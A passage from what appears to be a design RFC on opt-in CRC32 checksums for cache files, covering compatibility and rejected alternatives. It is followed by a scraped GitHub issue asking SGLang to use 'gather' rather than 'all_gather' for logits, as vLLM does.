Space and bandwidth are negligible; the real cost is **latency**. `_execute_load` handles keys sequentially, so each CRC adds directly to that chunk's load time. That's why this is opt-in. Hashing chunk N while reading chunk N+1 is the obvious follow-up. I'll post a `none` vs `crc32` load-throughput table on NVMe with the PR.

## Compatibility

- **Default `"none"`:** no behaviour or format change.
- **Enabling `"crc32"` on an existing directory:** old files have no trailer, so each is discarded on first access, a one-time miss.
- **A `"none"` reader on files written with `"crc32"`:** reads the payload length and ignores the trailer, so it works.
- **Shared directories:** all writers sharing a directory should use the same setting. It's documented.
- **Shared directories with `fs_native`:** it uses the same filenames, so the same rule applies. This RFC changes only the Python `fs` adapter.

## Alternatives considered

| Option | Why not (for now) |
|---|---|
| A checksum serde type (runs through the existing `SerdeL2AdapterWrapper`) | Covers every backend, but an adapter takes only one serde today, so it can't combine with fp8/turboquant; it also adds a temp-buffer copy. It's a good follow-up once serdes can chain. |
| xattr for the CRC | Not available on every filesystem (some NFS/FUSE setups); lost when files are copied. |
| A separate checksum file per object | Two files per object, and no atomic publish of both. |
| XOR / parity | No faster in practice (numpy XOR fold about 42 GB/s vs zlib-ng CRC32 about 48 GB/s on the same host), and it misses word reordering and paired bit flips. |
| crc32c (`google-crc32c`) / xxh3 | Faster on some CPUs but adds a dependency. The `checksum` string leaves room to add them. |
| Verifying at lookup | Would need a full read per lookup; load time is the natural point. |

items.title: [Feature] support `gather` instead of `all_gather` when gathering the logits
items.author: chunyuan-w
items.body_excerpt:
### Checklist

- [x] 1. If the issue you raised is not a feature but a question, please raise a discussion at https://github.com/sgl-project/sglang/discussions/new/choose Otherwise, it will be closed.
- [x] 2. Please use English, otherwise it will be closed.

### Motivation

We noticed that in the `_get_logits` function of vllm, `gather` instead of `all_gather` will be used under certain conditions (the main condition is that for non-tpu devices):
Code link:

- [logits = tensor_model_parallel_gather(logits)](https://github.com/vllm-project/vllm/blob/6e1fc61f0fb90c37f0d4a1a8f76235a6e4e1103c/vllm/model_executor/layers/logits_processor.py#L101C22-L101C50)

- [condition of whether using `all_gather` or `gather`](https://github.com/vllm-project/vllm/blob/6e1fc61f0fb90c37f0d4a1a8f76235a6e4e1103c/vllm/model_executor/layers/logits_processor.py#L53-L57)

The change from using `all_gather` to `gather` is initially added in this PR for your reference: https://github.com/vllm-project/vllm/pull/2221.

While in SGLang, we see currently `all_gather` is always used:
https://github.com/sgl-project/sglang/blob/e868d0b60eb2d435c5599165f787bca06bdc9c3d/python/sglang/srt/layers/logits_processor.py#L246

Does SGLang have the plan to add `gather` instead of only `all_gather` when gathering the logits? Per the practice in vllm, using `gather` seems to have better performance than `all_gather` on devices which have `gather` support.
